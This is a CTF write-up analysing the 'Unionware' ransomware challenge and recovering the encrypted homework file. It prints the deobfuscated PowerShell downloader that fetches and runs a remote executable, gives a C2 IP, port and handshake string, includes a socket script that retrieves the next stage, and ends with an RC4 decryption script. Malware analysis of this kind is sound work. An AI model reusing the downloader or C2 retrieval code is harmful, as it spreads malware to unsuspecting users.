# UnionCTF - Unionware

This challenge gives us two files: an "unionware.ps1" and a "important_homework.txt.unionware" containing seemingly random bytes. The challenge tells us that a ransomware encrypted the important homework and asks us to decrypt it.

## Analyzing the Powershell

While looking at the powershell, we can see an obfuscated Powershell command, which seems to split some random string and then evaluating it. So, we'll just run the part of the script which deobfuscates the payload without executing it, which give us:

```powershell

-joIN ( '105%102n40%36n69M78%86M58:85%115a101_114M68n111:109u97C105n110C32n45M101a113C32n34:72O77O82C67u34O41u32u123a13:10_32H32n32M32:40u78_101H119n45u79%98%106H101O99n116C32H39:78H101n116C46M87H101u98O67_108M105H101M110M116C39n41M46M68n111u119u110O108n111M97n100M70n105H108O101u40%34:104n116u116n112a115M58u47C47M115a116n111C114M97n103a101M46a103C111a111u103O108C101%97a112u105_115n46_99M111n109_47M101M117n45:117C110_105H111H110%99H116_102O45u50u48C50u49O47u108n110n69M76:75:78n100O111H105a101:46n101_120M101n34M44O32C34C36_69n78M86_58a116n101u109O112H92H108_110a69_76%75%78a100a111:105u101_46:101n120%101:34C41O13M10a32u32u32u32M115n116M97n114u116%32n36O69M78u86M58_116:101n109a112:92a108O110M69a76M75O78C100a111:105u101:46M101u120C101%13:10n125' -spLIT'a'-SPlIT'n'-SPLit ':'-spLiT 'u'-sPLIT '%' -SpLiT 'O' -sPLiT 'H'-SpLit'C' -SPLit'M' -spLIt '_' |%{ ( [ChAr][int]$_)} )

```
Unfortunately Windows Defender detects it as a malware, so we have to tell it to stfu, and then we get:
```powershell

if($ENV:UserDomain -eq "HMRC") {
    (New-Object 'Net.WebClient').DownloadFile("https://storage.googleapis.com/eu-unionctf-2021/lnELKNdoie.exe", "$ENV:temp\lnELKNdoie.exe")
    start $ENV:temp\lnELKNdoie.exe
}

```
The Powershell script is just a downloader for another executable we'll need to analyze

## Payload analysis
The executable is a 32-bit binary. The main function does a lot of anti-VM checks which were a bit annoying to bypass`, with function calls dynamically resolved through LoadLibrary/GetProcAddress with obfuscated strings.

```text
.text:00402177 loc_402177:                             ; CODE XREF: _main+6E↑j
.text:00402177                 call    AntiVMCheck1
.text:0040217C                 call    AntiVMCheck2
.text:00402181                 call    AntiVMCheck3
.text:00402186                 rdtsc
.text:00402188                 mov     esi, eax
.text:0040218A                 mov     edi, edx
```
After some debugging in x64dbg, I figure outd that the malware checks if it's installed into HKCU\Software\Microsoft\Windows\CurrentVersion\Run under the REG_SZ value "slkkmeLDDF". if not, it calls an install function to set up that key with the module path.

Then it attempts to communicate with the CnC to download the next stage:

```
lea     ecx, [ebp-450h]
mov     dword ptr [ebp-5FCh], 930956E3h
push    ecx
push    dword_40A3F8 ; should contain the port but ¯\_(ツ)_/¯
mov     dword ptr [ebp-5F8h], 0FBACEEF3h
lea     ecx, [ebp-600h] ; IP address decryption
mov     dword ptr [ebp-5F4h], 2BBFDE68h
mov     dword ptr [ebp-420h], 8E035C15h
mov     dword ptr [ebp-41Ch], 0A22767D7h
mov     dword ptr [ebp-418h], 0CD82D7C6h
mov     dword ptr [ebp-414h], 2BBFDE5Ah
movaps  xmm1, xmmword ptr [ebp-420h]
pxor    xmm1, xmmword ptr [ebp-600h]
push    ecx  ; contains the IP address of the CnC
movaps  xmmword ptr [ebp-600h], xmm1
call    eax
```

Unfortunately, the "dword_40A3F8" which should point to the port string contains garbage... After some xrefing in IDA, we come across this function, which is called as __initterm callback (i.e. before main is called):
```
mov     dword ptr [esp+20h+var_20], 0B9306F24h
lea     eax, [esp+20h+var_20]
mov     dword ptr [esp+20h+var_20+4], 0A22767D7h
mov     dword ptr [esp+20h+var_20+8], 0CD82D7C6h
mov     dword ptr [esp+20h+var_20+0Ch], 2BBFDE5Ah
mov     dword ptr [esp+20h+var_10], 8E035C15h
mov     dword ptr [esp+20h+var_10+4], 0A22767D7h
mov     dword ptr [esp+20h+var_10+8], 0CD82D7C6h
mov     dword ptr [esp+20h+var_10+0Ch], 2BBFDE5Ah
movaps  xmm1, [esp+20h+var_10]
pxor    xmm1, [esp+20h+var_20]
movaps  [esp+20h+var_20], xmm1
mov     dword_40A3F8, eax
```
The string is decrypted as "1337", but unfortunately a pointer to a local variable in the function's stack frame is stored into dword_40A3F8, and this stack frame is overwritten by other function calls, leading to garbage.

We know we need to connect to 35.241.159.62:1337

After manually setting the correct port in x64dbg, we notice that the string `KADMKLAFD:LSM$OPM@FLK:FM!N$@N$` is sent to the server, and then another annoying anti-debug trick hits us again. So let's connect to the server, send this string and see what's happens (yes it's ugly and you have to it ctrl+C to stop the script):
```python

import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# 159.65.197.149
s.connect(("35.241.159.62", 1337))
zgueg = b"KADMKLAFD:LSM$OPM@FLK:FM!N$@N$"
s.send(zgueg)
buf = b""
f = open("shlag.bin", "wb")
while True:
    tmp = s.recv(0x200)
    f.write(tmp)
f.close()

```

After running the script, we get a nice PE file waiting to be reversed :)

## Analysis of the server payload
We finally reach the final payload. After a quick inspection in IDA, smells ransomware:
```text
.text:00411FEF loc_411FEF:                             ; CODE XREF: WinMain(x,x,x,x)+353↑j
.text:00411FEF                 lea     edx, [ebp+ppszPath]
.text:00411FF5                 push    edx             ; ppszPath
.text:00411FF6                 push    0               ; hToken
.text:00411FF8                 push    0               ; dwFlags
.text:00411FFA                 push    offset rfid     ; rfid
.text:00411FFF                 call    ds:SHGetKnownFolderPath
.text:00412005                 mov     eax, 4
.text:0041200A                 imul    ecx, eax, 0
.text:0041200D                 mov     edx, [ebp+ecx+ppszPath]
.text:00412014                 push    edx             ; Src
.text:00412015                 lea     ecx, [ebp+var_5AC]
.text:0041201B                 call    sub_412C10
.text:0041201B ;   } // starts at 411FC5
.text:00412020 ;   try {
.text:00412020                 mov     byte ptr [ebp+var_4], 0Fh
.text:00412024                 push    offset aImportantReadm ; "\\IMPORTANT_README.txt"
```
Since it's C++ stuff with a lot of junk "proxy" function around STL objects (std::string, std::vector and recursive_directory_iterator), let's check what happens in x86dbg. The function enumerates all files into the "C:\Users\\\<username>\Documents\j3w3ls directory, checks if the file size is above 200 bytes and if so, adds it to the "to encrypt" list. So to trigger the ransomware, let's create the "j3w3ls" directory and put a junk file in it, before restarting the debugging.

We come across an interesting loop:
```
.text:00411ECF                 call    getfilename
.text:00411ED4                 mov     [ebp+filename], eax
.text:00411EDA                 mov     eax, [ebp+filename]
.text:00411EE0                 push    eax
.text:00411EE1                 lea     ecx, [ebp+pbuffer]
.text:00411EE7                 push    ecx
.text:00411EE8                 call    readbuf
.text:00411EED                 add     esp, 8
.text:00411EF0                 mov     [ebp+ppbuf], eax
.text:00411EF6                 mov     edx, [ebp+ppbuf]
.text:00411EFC                 push    edx             ; struct std::_Fake_allocator *
.text:00411EFD                 lea     ecx, [ebp+var_54C]
.text:00411F03                 call    alloc_stuff
.text:00411F08                 lea     ecx, [ebp+pbuffer]
.text:00411F0E                 call    vector_destroy
.text:00411F13                 lea     eax, [ebp+var_54C]
.text:00411F19                 push    eax
.text:00411F1A                 lea     ecx, [ebp+var_628]
.text:00411F20                 push    ecx
.text:00411F21                 call    EncryptionHappensHere
```
The "EncryptionHappensHere" function does a lot of crypto++ wizardry (I spent a lot of time identifying Crypto++ parts of the bin): it generates a private RSA key from a random pool, then sends it to the CnC:
```
.text:0040639D                 lea     ecx, [ebp+randomGenerator]
.text:004063A3                 call    CreateAutoSeededRandomPool
.text:004063A8                 mov     [ebp+stepCounter], 0
.text:004063AF                 push    10Ch            ; Size
.text:004063B4                 lea     ecx, [ebp+privkey]
.text:004063BA                 call    zeromem
.text:004063BF                 push    1               ; int
.text:004063C1                 lea     ecx, [ebp+privkey]
.text:004063C7                 call    InvertibleRSAFunction__ctor
.text:004063CC                 mov     byte ptr [ebp+stepCounter], 1
.text:004063D0                 lea     eax, [ebp+privkey+44h]
.text:004063D6                 mov     [ebp+privkeyObj], eax
.text:004063DC                 push    400h            ; keyBits
.text:004063E1                 lea     ecx, [ebp+randomGenerator]
.text:004063E7                 push    ecx             ; randomGenerator
.text:004063E8                 mov     ecx, [ebp+privkeyObj]
.text:004063EE                 call    InvertibleRSAFunction__Initialize
[...]
.text:00406428                 push    1
.text:0040642A                 lea     eax, [ebp+privkey]
.text:00406430                 push    eax
.text:00406431                 lea     ecx, [ebp+generated_pubk]
.text:00406437                 call    RSAFunction__RSAFunction
.text:0040643C                 mov     byte ptr [ebp+stepCounter], 3
.text:00406440                 lea     ecx, [ebp+privkeyDer]
.text:00406443                 call    new_std_string
.text:00406448                 mov     byte ptr [ebp+stepCounter], 4
.text:0040644C                 push    14h             ; Size
.text:0040644E                 lea     ecx, [ebp+output]
.text:00406451                 call    zeromem
.text:00406456                 lea     ecx, [ebp+privkeyDer]
.text:00406459                 push    ecx
.text:0040645A                 lea     ecx, [ebp+output] ; output
.text:0040645D                 call    StringSinkTemplate__StringSinkTemplate
.text:00406462                 mov     byte ptr [ebp+stepCounter], 5
.text:00406466                 lea     edx, [ebp+privKeyCopy]
.text:0040646C                 push    edx
.text:0040646D                 lea     eax, [ebp+output]
.text:00406470                 push    eax
.text:00406471                 call    EncodePrivateKey
.text:00406476                 add     esp, 8
.text:00406479                 lea     ecx, [ebp+privkeyDer]
.text:0040647C                 push    ecx
.text:0040647D                 call    SendKeyToCC
```
Then the funny stuff begins. The functions creates a public key from the generated private key, uses it to construct a RSAES_OAEP_SHA_Encryptor from the public key.
Then it constructs an ArraySink from a STL vector's buffer, which is passed as a bufferedTransformation to the PK_EncryptorFilter. This EncryptorFilter will be then given to the StringSource which will read the 86 first bytes of the string:
```
mov     ecx, [ebx+0Ch]
call    string_getdata
mov     [ebp+file_contents_buf], eax
mov     ecx, [ebp+encFilter_temp3]
push    ecx             ; transformation
push    1               ; pumpAll
push    86              ; length
mov     edx, [ebp+file_contents_buf]
push    edx             ; zstring
lea     ecx, [ebp+stringsource]
call    CreateStringSource
```
In C++, this would give something like this:
```cpp

// filebuf is a std::string passed as argument
// pub_from_privkey is the public key derived from the random privkey
// rng is the random pool seen above
std::vector<char> encrypted;
encrypted.resize(0x80);
RSAES_OAEP_SHA_Encryptor e (pub_from_privkey);
source = StringSource(
    filebuf.c_str(),
    86,
    true,
    new PK_EncryptorFilter(
        rng,
        e,
        new ArraySink(&encrypted[0], 0x80)
    ));

```
After the call, our "encrypted" contains the encrypted 86 first bytes of the file. Then, after doing some output string initialization, it does:
```
mov     ecx, [ebx+0Ch]
call    string_getsize
sub     eax, 56h
push    eax
lea     ecx, [ebp+rc4_enc_buf]
call    str_resize
lea     eax, [ebp+rc4_enc_buf]
push    eax             ; outStr
mov     ecx, [ebx+0Ch]
push    ecx             ; clearStr
lea     edx, [ebp+rsaEncrypted_vec]
push    edx             ; rc4key
call    RC4Encryption
add     esp, 0Ch
```
The RC4 encryption function was easy to identify, thanks to its key scheduling function at 0x00405E50 called by RC4Encryption. Now, we know that RSA_OAEP(fileBuf[0:56]) is the RC4 key to encrypt the rest of the file. Now, let's check where the key is saved into the encrypted file, so we may recover the whole file minus the 56 first bytes.

We get a first copy loop, which copies the RSA-encrypted buffer into the return buffer:
```
.text:0040667C                 jmp     short loop1
.text:0040667E ; ------------------------------------------------------------
.text:0040667E
.text:0040667E loop1_next:                             ; CODE XREF: EncryptionHappensHere+387↓j
.text:0040667E                 mov     eax, [ebp+counter]
.text:00406684                 add     eax, 1
.text:00406687                 mov     [ebp+counter], eax
.text:0040668D
.text:0040668D loop1:                                  ; CODE XREF: EncryptionHappensHere+33C↑j
.text:0040668D                 cmp     [ebp+counter], 80h
.text:00406697                 jge     short loop1_finished
.text:00406699                 mov     ecx, [ebp+counter]
.text:0040669F                 push    ecx
.text:004066A0                 lea     ecx, [ebp+rsaEncrypted_vec]
.text:004066A3                 call    vector_getdata
.text:004066A8                 mov     dl, [eax]
.text:004066AA                 mov     [ebp+tmp], dl
.text:004066B0                 mov     eax, [ebp+counter]
.text:004066B6                 push    eax
.text:004066B7                 lea     ecx, [ebp+outbuffer]
.text:004066BA                 call    vector_getdata
.text:004066BF                 mov     cl, [ebp+tmp]
.text:004066C5                 mov     [eax], cl
.text:004066C7                 jmp     short loop1_next
```
Then, we get a second loop which copies the RC4-encrypted buffer:
```
.text:004066C9 loop1_finished:                         ; CODE XREF: EncryptionHappensHere+357↑j
.text:004066C9                 mov     [ebp+counter2], 80h
.text:004066D3                 jmp     short loop2
.text:004066D5 ; ---------------------------------------------------------------------------
.text:004066D5
.text:004066D5 loop2_next:                             ; CODE XREF: EncryptionHappensHere+3E7↓j
.text:004066D5                 mov     edx, [ebp+counter2]
.text:004066DB                 add     edx, 1
.text:004066DE                 mov     [ebp+counter2], edx
.text:004066E4
.text:004066E4 loop2:                                  ; CODE XREF: EncryptionHappensHere+393↑j
.text:004066E4                 lea     ecx, [ebp+outbuffer]
.text:004066E7                 call    string_getsize
.text:004066EC                 cmp     [ebp+counter2], eax
.text:004066F2                 jnb     short loopEnd
.text:004066F4                 mov     eax, [ebp+counter2]
.text:004066FA                 sub     eax, 80h
.text:004066FF                 push    eax
.text:00406700                 lea     ecx, [ebp+rc4_enc_buf]
.text:00406703                 call    vector_getdata
.text:00406708                 mov     cl, [eax]
.text:0040670A                 mov     [ebp+tmp2], cl
.text:00406710                 mov     edx, [ebp+counter2]
.text:00406716                 push    edx
.text:00406717                 lea     ecx, [ebp+outbuffer]
.text:0040671A                 call    vector_getdata
.text:0040671F                 mov     cl, [ebp+tmp2]
.text:00406725                 mov     [eax], cl
.text:00406727                 jmp     short loop2_next
.text:00406729 ; ---------------------------------------------------------------------------
.text:00406729
.text:00406729 loopEnd:                                ; CODE XREF: EncryptionHappensHere+3B2↑j
.text:00406729                 lea     edx, [ebp+outbuffer]
```
Then, the program does some cleanup, before returning to the caller, which writes the encrypted content into the file.

Now, we can write a Python script to recover most of the file:
```python

from Crypto.Cipher import ARC4

f = open("important_homework.txt.unionware", "rb")
buf = f.read()

k = buf[0:0x80]
blop = ARC4.new(k)
rofl = open("out.txt", "wb")
rofl.write(blop.decrypt(buf[0x80:]))

```
And after searching the "{" char in the file, we finally get the flag: `union{d1d_y0u_g3t_m3_th0s3_cr0wn_j3w3ls?}`.

That's all folks ! :þ
